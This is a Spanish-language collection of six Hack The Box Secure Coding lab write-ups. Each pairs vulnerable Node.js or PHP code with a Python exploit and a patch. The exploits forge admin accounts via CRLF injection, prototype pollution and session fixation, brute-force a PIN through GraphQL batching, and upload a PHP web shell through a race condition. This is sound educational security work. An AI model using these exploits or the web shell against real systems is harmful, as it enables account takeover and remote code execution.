---
title: "HTB Secure Coding Season 10 — Complete Writeup Collection"
date: 2026-04-20
description: "Seis writeups de Secure Coding: CRLF Injection, Prototype Pollution, GraphQL Batching, Path Traversal, IDOR y Session Fixation + Race Condition. Con análisis de vulnerabilidad, exploit y parche documentado."
excerpt: "Análisis completo de 6 desafíos Secure Coding de HackTheBox Season 10: identificación, explotación y remediación de vulnerabilidades en código fuente."
tags: ["HTB", "Secure Coding", "Web", "CRLF", "Prototype Pollution", "GraphQL", "Path Traversal", "IDOR", "Race Condition", "Session Fixation", "Node.js", "PHP"]
platform: "HTB"
difficulty: "Medium"
image: "/images/blog/fluid-web.png"
---

<div align="center">

# HTB Secure Coding — Writeups

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![Season](https://img.shields.io/badge/Season-10-orange?style=for-the-badge)
![Rank](https://img.shields.io/badge/Rank_%231-Ecuador-red?style=for-the-badge)
![Team](https://img.shields.io/badge/Team-CyberFlippers-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

> **Disclaimer:** Writeups realizados en entornos autorizados de Hack The Box con fines educativos. El enfoque es *Secure Coding* — identificar, explotar y parchear vulnerabilidades en código fuente.

---

## Índice

1. [Powergrid — CRLF / Delimiter Injection](#1-powergrid--crlf--delimiter-injection)
2. [AgriWeb — Prototype Pollution](#2-agriweb--prototype-pollution)
3. [HydroAdmin — GraphQL Batching Attack](#3-hydroadmin--graphql-batching-attack)
4. [ResourceHub Core — Path Traversal en File Upload](#4-resourcehub-core--path-traversal-en-file-upload)
5. [CommNet — IDOR en Mensajes](#5-commnet--idor-en-mensajes)
6. [Phoenix Pipeline — Session Fixation + Race Condition](#6-phoenix-pipeline--session-fixation--race-condition)

---

## 1. Powergrid — CRLF / Delimiter Injection

| Campo | Valor |
|-------|-------|
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | CRLF / Delimiter Injection en Flat-File DB |
| Stack | Node.js / Express |

### Descripción

La aplicación almacena usuarios en `users.txt` con formato pipe-delimited:

```
username|sha256_hash|role
```

### Vulnerabilidad

`addUser()` en `utils/db.js` no sanitiza el `username` antes de escribirlo al archivo. Un atacante puede inyectar `|` para controlar los campos y `\n` para crear una segunda línea, registrando efectivamente un usuario `admin` con credenciales conocidas.

```javascript
// VULNERABLE — utils/db.js
export function addUser(username, password, role = 'operator') {
    const users = readUsers();
    // No hay sanitización del username
    const newUser = { username, password: hashPassword(password), role };
    users.push(newUser);
    return writeUsers(users);
}
```

### Exploit

```python
import hashlib, requests

TARGET = "http://<IP>:<PORT>"
USER   = "pwned"
PASS   = "CoolPassword17!"

h = hashlib.sha256(PASS.encode()).hexdigest()
payload_user = f"{USER}|{h}|admin\n{USER}"

requests.post(f"{TARGET}/challenge/api/auth/register",
    json={"username": payload_user, "password": PASS})

s = requests.Session()
s.post(f"{TARGET}/challenge/api/auth/login",
    json={"username": USER, "password": PASS})
# → role: admin
```

El `writeUsers()` produce dos líneas en `users.txt`:

```
pwned|4befd7f...|admin
pwned|<hash_real>|operator
```

`readUsers()` lee la primera línea y autentica con `role: admin`.

### Parche

```javascript
// utils/db.js — addUser()
const USERNAME_REGEX = /^[a-zA-Z0-9_\-\.]{3,32}$/;

export function addUser(username, password, role = 'operator') {
    if (!['admin', 'operator'].includes(role)) return false;
    if (typeof username !== 'string') return false;

    // Blacklist explícita de caracteres de control
    if (/[|\n\r\0\t]/.test(username)) return false;

    // Whitelist estricta
    if (!USERNAME_REGEX.test(username)) return false;

    if (typeof password !== 'string' || password.length < 8) return false;

    const users = readUsers();
    if (users.find(u => u.username === username)) return false;

    users.push({ username, password: hashPassword(password), role });
    return writeUsers(users);
}
```

**Defensa en capas:** blacklist de chars de control primero, luego whitelist con regex. Los anchors `^` y `$` aseguran que el match cubra el string completo — sin flags multiline.

---

## 2. AgriWeb — Prototype Pollution

| Campo | Valor |
|-------|-------|
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | Prototype Pollution vía `deepMerge()` |
| Stack | Node.js / Express / SQLite |

### Descripción

Aplicación de gestión agrícola con JWT. El admin panel retorna la flag si `req.user.isAdmin === true`.

### Vulnerabilidad

`routes/profile.js` implementa un `deepMerge()` recursivo sin filtrar keys peligrosas:

```javascript
// VULNERABLE — routes/profile.js
function deepMerge(target, source) {
    for (let key in source) {
        // key puede ser "__proto__", "constructor", "prototype"
        if (source[key] && typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

### Exploit

```python
import requests

BASE = "http://<IP>:<PORT>/challenge"
s = requests.Session()

s.post(f"{BASE}/api/auth/register", json={"username":"h","email":"h@t.com","password":"h"})
r = s.post(f"{BASE}/api/auth/login", json={"username":"h","password":"h"})
token = r.json()["token"]

# Prototype pollution — inyecta isAdmin en Object.prototype
s.post(f"{BASE}/api/profile",
    json={"__proto__": {"isAdmin": True}},
    headers={"Authorization": f"Bearer {token}"})

# Todos los objetos heredan isAdmin: true
r = s.get(f"{BASE}/admin", headers={"Authorization": f"Bearer {token}"})
print(r.json()["flag"])
```

### Parche

```javascript
// routes/profile.js
const BLOCKED_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function deepMerge(target, source) {
    for (let key in source) {
        if (BLOCKED_KEYS.has(key)) continue;
        if (!Object.prototype.hasOwnProperty.call(source, key)) continue;

        if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
            if (!target[key]) target[key] = Object.create(null);
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

**Tres capas:** `BLOCKED_KEYS` bloquea las keys peligrosas, `hasOwnProperty` evita iterar keys heredadas en el `for...in`, y `Object.create(null)` crea objetos intermedios sin prototype.

---

## 3. HydroAdmin — GraphQL Batching Attack

| Campo | Valor |
|-------|-------|
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | GraphQL Batching — Rate Limit Bypass |
| Stack | Node.js / Apollo Server / GraphQL Armor |

### Descripción

Sistema de gestión de agua con PIN de 4 dígitos (1000–9999). Rate limit de 10 requests/minuto. Apollo Server con `allowBatchedHttpRequests: true`.

### Vulnerabilidad

Con batching habilitado, Apollo acepta arrays de operaciones en un solo HTTP request. El rate limiter cuenta el array como **una** request, pero ejecuta las **N** operaciones internas. Con batches de 1500 PINs y 6 requests se cubre todo el espacio de 9000 valores.

```javascript
// VULNERABLE — index.js
const server = new ApolloServer({
    ...armor.protect(),
    introspection: false,
    typeDefs,
    allowBatchedHttpRequests: true,  // ← permite brute-force
    resolvers
});
```

### Exploit

```python
import requests

BASE_URL = "http://<IP>:<PORT>/challenge"

def create_batch_query(start_pin, end_pin):
    return [
        {"query": f'mutation{{verifyAccessPin(pin:"{pin:04d}"){{authorized}}}}'}
        for pin in range(start_pin, end_pin)
    ]

# 1500 mutaciones en 1 HTTP request → rate limiter ve 1 request
batch = create_batch_query(1000, 2500)
response = requests.post(f"{BASE_URL}/graphql", json=batch)
# → buscar {"authorized": true} en la respuesta
```

### Parche

```javascript
// index.js
const server = new ApolloServer({
    ...armor.protect(),
    introspection: false,
    typeDefs,
    allowBatchedHttpRequests: false,  // ← una línea, fix completo
    resolvers
});
```

---

## 4. ResourceHub Core — Path Traversal en File Upload

| Campo | Valor |
|-------|-------|
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | Path Traversal (CWE-22) en filename de upload |
| Stack | Node.js / Express / formidable |

### Descripción

Portal de recursos con upload de archivos. El filename del multipart se usa directamente en `path.join()` sin sanitización.

### Vulnerabilidad

```javascript
// VULNERABLE — routes/routes.js
const targetFilename = file.originalFilename;  // controlado por el atacante
const targetPath = path.join(__dirname, '../resources', targetFilename);
fs.renameSync(file.filepath, targetPath);
// path.join resuelve ../ — permite escribir fuera de resources/
```

### Exploit

```python
import requests

BASE = "http://<IP>:<PORT>/challenge"

files = {
    'file': ('../static/js/pwned.txt', b'path_traversal_proof', 'text/plain')
}
requests.post(f"{BASE}/api/upload-resource",
    files=files, data={'category': 'test', 'priority': 'low'})

# El archivo queda en static/js/ accesible vía web
r = requests.get(f"{BASE}/js/pwned.txt")
print(r.text)  # → path_traversal_proof
```

### Parche

```javascript
// routes/routes.js
const targetFilename = path.basename(file.originalFilename);  // strip ../

if (!targetFilename || targetFilename === '') {
    return res.status(400).json({ success: false, error: 'Invalid filename' });
}

const targetPath = path.join(resourcesDir, targetFilename);

// Confirmar que el path resuelto sigue dentro del directorio permitido
if (!targetPath.startsWith(resourcesDir)) {
    return res.status(400).json({ success: false, error: 'Invalid file path' });
}

fs.renameSync(file.filepath, targetPath);
```

**Dos capas:** `path.basename()` elimina cualquier componente de directorio, y la verificación post-join confirma que el path resuelto sigue dentro de `resourcesDir`.

---

## 5. CommNet — IDOR en Mensajes

| Campo | Valor |
|-------|-------|
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | IDOR — Insecure Direct Object Reference (CWE-639) |
| Stack | Node.js / Express / SQLite |

### Descripción

Plataforma de mensajería entre usuarios. El endpoint `GET /messages/:id` requiere autenticación pero no verifica ownership del mensaje.

### Vulnerabilidad

```javascript
// VULNERABLE — routes/messages.js
router.get('/:id', requireAuth, (req, res) => {
    const messageId = req.params.id;
    // Sin verificar sender_id ni recipient_id
    req.db.get(`
        SELECT m.* FROM messages m
        WHERE m.id = ?    -- solo filtra por ID
    `, [messageId], ...);
});
```

### Exploit

```python
import requests

BASE = "http://<IP>:<PORT>/challenge"
s = requests.Session()

s.post(f"{BASE}/api/auth/register",
    json={"username":"h","email":"h@t.com","password":"h","enclave":"West"})
s.post(f"{BASE}/api/auth/login", json={"username":"h","password":"h"})

# Acceder a mensaje de admin sin ser sender ni recipient
r = s.get(f"{BASE}/api/messages/3")
print(r.json()["message"]["content"])  # → flag
```

### Parche

```javascript
// routes/messages.js — GET /:id
router.get('/:id', requireAuth, (req, res) => {
    const messageId = req.params.id;
    const userId = req.session.userId;  // ← ownership check

    req.db.get(`
        SELECT m.*,
               sender.username    AS sender_username,
               recipient.username AS recipient_username
        FROM messages m
        LEFT JOIN users sender    ON m.sender_id    = sender.id
        LEFT JOIN users recipient ON m.recipient_id = recipient.id
        WHERE m.id = ?
          AND (m.sender_id = ? OR m.recipient_id = ? OR m.recipient_id IS NULL)
    `, [messageId, userId, userId], (err, message) => {
        if (err || !message) {
            return res.status(404).json({ success: false, error: 'Message not found' });
        }
        res.json({ success: true, message });
    });
});
```

La cláusula `AND` asegura que solo el sender, el recipient, o mensajes broadcast (`recipient_id IS NULL`) son accesibles.

---

## 6. Phoenix Pipeline — Session Fixation + Race Condition

| Campo | Valor |
|-------|-------|
| Dificultad | Medium |
| Categoría | Web |
| Puntos | 30 |
| Vulnerabilidades | Session Fixation en registro + Race Condition en file upload |
| Stack | PHP / SQLite |

### Descripción

Aplicación PHP de gestión de infraestructura con dos roles: `operator` y `admin`. Dos vulnerabilidades independientes que combinadas entregan acceso total.

---

### Vuln 1 — Session Fixation / Username Collision

**Código vulnerable — `AuthController.php`:**

```php
public static function register() {
    $db = Database::getInstance()->getConnection();
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $area     = $_POST['area'] ?? '';

    // ← SESIÓN SETEADA ANTES DE VERIFICAR UNICIDAD
    $_SESSION['username'] = $username;
    $_SESSION['area'] = $area;

    $stmt = $db->prepare('SELECT * FROM users WHERE username = ?');
    $stmt->execute([$username]);
    if ($stmt->fetch()) {
        header('Location: /challenge/username-exists');
        exit;
        // $_SESSION['username'] = 'admin' persiste aunque el redirect ocurra
    }
}
```

**Exploit:**

```python
import requests

BASE = "http://<IP>:<PORT>/challenge"
s = requests.Session()

# Registrar 'admin' → ya existe → redirect a username-exists
# La sesión queda con username='admin' antes del redirect
r = s.post(f"{BASE}/register",
    data={"username": "admin", "password": "admin", "area": "Aetheria"},
    allow_redirects=False)

cookie = r.cookies

# Acceder al admin panel con la sesión fixada
r = s.get(f"{BASE}/admin", cookies=cookie)
print("ADMIN CONTROL" in r.text)  # → True
```

**Parche:**

```php
public static function register() {
    $db = Database::getInstance()->getConnection();
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $area     = $_POST['area'] ?? '';

    // FIX: verificar unicidad ANTES de tocar la sesión
    $stmt = $db->prepare('SELECT * FROM users WHERE username = ?');
    $stmt->execute([$username]);
    if ($stmt->fetch()) {
        header('Location: /challenge/username-exists');
        exit;
    }

    $hash = password_hash($password, PASSWORD_DEFAULT);
    $stmt = $db->prepare('INSERT INTO users (username, password, role, area) VALUES (?, ?, ?, ?)');
    $stmt->execute([$username, $hash, 'operator', $area]);

    // Sesión solo después de INSERT exitoso
    $_SESSION['username'] = $username;
    $_SESSION['area'] = $area;

    header('Location: /challenge/operator');
    exit;
}
```

---

### Vuln 2 — Race Condition en File Upload (RCE)

**Código vulnerable — `OperatorController.php`:**

```php
// 1. Mueve el archivo a /uploads/ con extensión original (puede ser .php)
move_uploaded_file($tmp_name, $tempfile);  // ← archivo accesible en web

// 2. Ventana de race condition — shell.php ejecutable durante la validación

// 3. Valida MIME DESPUÉS de mover
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $tempfile);  // tarde — ya está en disco

if (strpos($mime, 'image/') !== 0) {
    unlink($tempfile);  // borra, pero la race ya fue ganada
}
```

**Exploit:**

```python
import threading, requests

BASE  = "http://<IP>:<PORT>/challenge"
cookie = {}  # sesión con rol operator

def upload():
    requests.post(f"{BASE}/report",
        files={"photo": ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/gif")},
        data={"infra_id": "1", "description": "x"},
        cookies=cookie)

def hit():
    requests.get(f"{BASE}/uploads/temp_<md5>_<date>.php?cmd=id", cookies=cookie)

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=hit)
t1.start(); t2.start()
t1.join(); t2.join()
```

**Parche:**

```php
$original = $_FILES['photo']['name'];
$ext      = strtolower(pathinfo($original, PATHINFO_EXTENSION));
$tmp_name = $_FILES['photo']['tmp_name'];

// FIX 1: validar extensión ANTES de mover
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'];
if (!in_array($ext, $allowed)) {
    $showFormWithError('Invalid file extension.');
    return;
}

// FIX 2: validar MIME en tmp_name (en /tmp del SO, no accesible vía web)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $tmp_name);
finfo_close($finfo);

if (strpos($mime, 'image/') !== 0) {
    $showFormWithError('Invalid file type.');
    return;
}

// Solo mover si pasó ambas validaciones
$date     = date('Y_m_d');
$rand     = md5($original);
$tempfile = __DIR__ . '/../uploads/temp_' . $rand . '_' . $date . '.' . $ext;

if (!move_uploaded_file($tmp_name, $tempfile)) {
    $showFormWithError('Failed to upload file.');
    return;
}
```

El fix elimina la race condition moviendo ambas validaciones **antes** del `move_uploaded_file`. El archivo nunca llega a `/uploads/` con extensión ejecutable.

---

## Resumen de Vulnerabilidades

| # | Challenge | Vulnerabilidad | Impacto | Fix clave |
|---|-----------|----------------|---------|-----------|
| 1 | Powergrid | CRLF Injection | Privilege escalation → admin | Whitelist regex en username |
| 2 | AgriWeb | Prototype Pollution | Bypass auth → admin | Blocklist `__proto__` en deepMerge |
| 3 | HydroAdmin | GraphQL Batching | Rate limit bypass → PIN bruteforce | `allowBatchedHttpRequests: false` |
| 4 | ResourceHub Core | Path Traversal | Arbitrary file write | `path.basename()` + validación post-join |
| 5 | CommNet | IDOR | Lectura de mensajes privados | Ownership check en WHERE clause |
| 6 | Phoenix Pipeline | Session Fixation + Race Condition | Admin takeover + RCE | Sesión post-INSERT + validación pre-move |

---

## Key Takeaways

1. **Nunca setear estado antes de validar** — sesión, DB, o cualquier efecto secundario va *después* de todas las verificaciones.

2. **Whitelist > Blacklist** — `^[a-zA-Z0-9_]{3,32}$` es más robusta que intentar enumerar chars prohibidos.

3. **Validar en el punto de entrada** — en file uploads, MIME y extensión se validan sobre `tmp_name` antes de cualquier `move`. Una vez en el webroot es tarde.

4. **Authorization ≠ Authentication** — `requireAuth` verifica que el usuario está logueado. El ownership check verifica que puede acceder a *ese* recurso específico.

5. **Rate limiting a nivel de operación, no de request** — GraphQL batching, alias batching y técnicas similares permiten N operaciones por HTTP request. El rate limiter debe contar operaciones.

6. **`path.join()` no sanitiza** — resuelve `../` fielmente. `path.basename()` + verificación post-join es el patrón correcto.

---

<div align="center">

**Flippermen**
*HackTheBox Season 10 — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
